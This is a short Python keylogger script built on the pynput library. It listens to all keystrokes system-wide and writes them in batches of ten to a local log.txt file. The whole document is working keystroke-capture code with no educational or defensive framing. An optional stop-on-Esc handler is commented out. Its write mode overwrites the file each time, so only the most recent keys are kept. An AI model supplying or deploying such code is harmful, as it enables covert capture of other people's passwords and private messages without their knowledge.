import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(e):
    global keys, count
    keys.append(e)
    count += 1
    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open("log.txt", "w+") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                    f.write('  ')
            elif k.find("Key") == -1:
                    f.write(k)

# Uncomment the function below to activate stopping the script when pressing Esc Key                    
#def on_release(e):
#    if e == Key.esc:
#        return False

with Listener(on_press = on_press) as listener:
    listener.join()
